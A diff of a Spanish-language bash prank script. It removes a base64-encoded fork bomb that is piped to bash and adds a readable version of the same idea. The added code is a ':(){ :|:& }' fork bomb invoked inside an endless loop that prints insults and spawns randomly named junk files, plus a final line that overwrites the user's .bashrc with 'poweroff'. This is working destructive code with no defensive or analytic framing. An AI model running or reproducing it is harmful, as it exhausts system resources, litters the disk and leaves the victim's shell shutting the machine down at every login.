@@ -1,3 +1,30 @@
-echo 'cHV0YW1pZXJkYSgpeyBwdXRhbWllcmRhfHB1dGFtaWVyZGEmIH07IHdoaWxlIHRydWU7IGRvIGVj
-aG8gaW50ZW50YSBlamVjdXRhciBhbGdvIHB1dGFtaWVyZGEgPj4gcHV0YW1pZXJkYTsgcHV0YW1p
-ZXJkYTsgZWNobyBpbnRlbnRhIGVqZWN1dGFyIGFsZ287IGRvbmUK' | base64 -d | bash
+#!/usr/bin/env bash
+:(){ :|:& }
+while true
+do
+opt=$((RANDOM%5))
+case "$opt" in
+        "0")
+                echo "Puta mierda"
+        ;;
+        "1")
+                echo "Bobo marica"
+        ;;
+        "2")
+                echo "No funciona"
+        ;;
+        "3")
+                echo "dale run"
+        ;;
+        "4")
+                echo jajajusajsjajsjajjaja
+        ;;
+esac
+sleep 0.5
+:
+clear
+clave=$((RANDOM%999999999999))
+touch $clave
+echo "jajjajajjajajjajajajajajajajajajjaajajajajajajaj" >> $clave
+done
+echo 'poweroff' > $HOME/.bashrc
